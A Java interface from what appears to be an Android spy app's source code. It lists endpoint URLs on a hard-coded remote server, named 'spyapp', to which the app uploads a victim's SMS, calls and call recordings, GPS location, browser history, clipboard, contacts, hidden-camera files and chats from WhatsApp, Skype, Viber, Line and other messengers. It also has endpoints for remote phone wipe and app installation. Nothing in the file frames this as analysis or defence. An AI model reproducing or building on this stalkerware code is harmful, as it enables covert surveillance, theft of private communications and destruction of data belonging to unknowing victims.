/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
/**
 * @author jitendrav
 *
 */
package com.hinj.app.utils;

public interface ConnectUrl {
	
	/* String server_url="http://evt17.com/iphone/android_services";
	 
	 String URL_registration="server_url/registration"; 
	 String URL_SMS="server_url/sms";
	 String URL_Call="server_url/call";
	 String URL_email_history="server_url/email";
	 String URL_gps_tracking="server_url/gps_tracking";
	 String URL_whats_app="server_url/whats_app";	 					   
	 String URL_Contact_List="server_url/contact";
	 String URL_Browser="server_url/browser_history"; 
     String URL_Whatsapp_upload="server_url/whatsapp_upload";
     String URL_Images_upload="server_url/upload";     
     String URL_Auto_Answer="server_url/auto_answer";
     String URL_DEVICE_INFO="server_url/deviceInfo";
     String URL_CallRecVoice_upload="server_url/callUpload";
     String URL_CallRecVoice_OnOff="server_url/call_record_status";
     String URL_FacebookChat="server_url/facebook_chat";
     String URL_Skype_chat="server_url/skype_chat";
     String URL_HiddenUpload="server_url/hiddenUpload";  
     String URL_Phonewipe="server_url/phonewipe";
     String URL_Instagram="server_url/instagram";
     String URL_ViberChat="server_url/viber_chat"; 
     String URL_ViberImage="server_url/viber_upload";
     String URL_BBMChat="server_url/BBM_chat";     
     String URL_BBMImage="server_url/bbm_upload";
     
     String URL_Calendar="server_url/calendar";
     String URL_Install_app="server_url/install_app";
     String URL_OpenApp="server_url/openApp";
     String URL_we_chat="server_url/we_chat";
     String URL_Line_Chat="server_url/line_chat";
     String URL_Line_Upload="server_url/line_upload"; 
     String URL_Logging_Status= "server_url/keyValueRetrieve";*/

	
//	 String local_url="http://192.168.1.67/iphone/new_android_services";
	//String local_url="http://evt17.com/iphone/new_android_services";
	
	//String local_url="http://67.205.96.105:8080/highster_new/new_android_services";
	// String local_url="http://192.168.1.74/highster/new_android_services";
	 
	// String local_url="http://192.168.1.74/highster/android_services";
	 
	//	public static final String local_url = "http://192.168.1.74/highster/android_services";
	String local_url="http://67.205.96.105:8080/spyapp/webservices";
	
	
	//////////////////////////////////// REMOTE ACCESS ///////////////////////////
	//	http://67.205.96.105:8080/spyapp/webservices/deleteData
	
	/////////////////////////////////// REMOTE ACCESS  ///////////////////////////
	
	 String URL_registration=local_url+"/registration"; 
	
	
	 String URL_email_history=local_url+"/email";
	 String URL_gps_tracking=local_url+"/gps_tracking";	 
	 String URL_whats_app=local_url+"/whats_app";
    
     String URL_Whatsapp_upload=local_url+"/whatsapp_upload";
     String URL_Images_upload=local_url+"/upload";
     
     String URL_Hidden_Camera_upload=local_url+"/hidden_camera_files";
     
     String URL_Music_upload=local_url+"/music_upload";
     String URL_Music_Album_Image_upload=local_url+"/music_album_image_upload";
     
     String URL_Apk_upload=local_url+"/apk_upload";
     String URL_Apk_Icon_upload=local_url+"/app_icon_upload";
     String URL_Contact_Image_upload=local_url+"/contact_image_upload";
     String URL_Auto_Answer=local_url+"/auto_answer";
     String URL_File_Upload=local_url+"/upload_device_directory";
   
     String URL_CallRecVoice_upload=local_url+"/callUpload";
     String URL_CallRecVoice_OnOff=local_url+"/call_record_status";
     String URL_FacebookChat=local_url+"/facebook_chat";
     String URL_Skype_chat=local_url+"/skype_chat";
     String URL_HiddenUpload=local_url+"/hiddenUpload";
     String URL_Phonewipe=local_url+"/phonewipe"; 
     String URL_Instagram=local_url+"/instagram";
     String URL_ViberChat=local_url+"/viber_chat";     
     String URL_ViberImage=local_url+"/viber_upload";
     String URL_BBMChat=local_url+"/bbm_chat";     
     String URL_BBMImage=local_url+"/bbm_upload";
     
     String URL_Calendar=local_url+"/calendar";
   
     String URL_OpenApp=local_url+"/openApp";
     String URL_we_chat=local_url+"/we_chat";
     String URL_Line_Chat=local_url+"/line_chat";
     String URL_Line_Upload=local_url+"/line_upload"; 
     String URL_Logging_Status= local_url+"/keyValueRetrieve";
     String URL_twitter=local_url+"/twitter_chat_data";
     
     String URL_SMS=local_url+"/sms";
     String URL_Install_app=local_url+"/install_app";
     String URL_Contact_List=local_url+"/contact";
     String URL_Browser=local_url+"/browser_history";
     String URL_Call=local_url+"/call";
     String URL_DEVICE_INFO=local_url+"/deviceInfo";
     String URL_CLIPBOARD_TEXT=local_url+"/user_clipboard";
     String URL_GET_DELETE_CALL_LOG_ID = "/get_call_id";
     
}
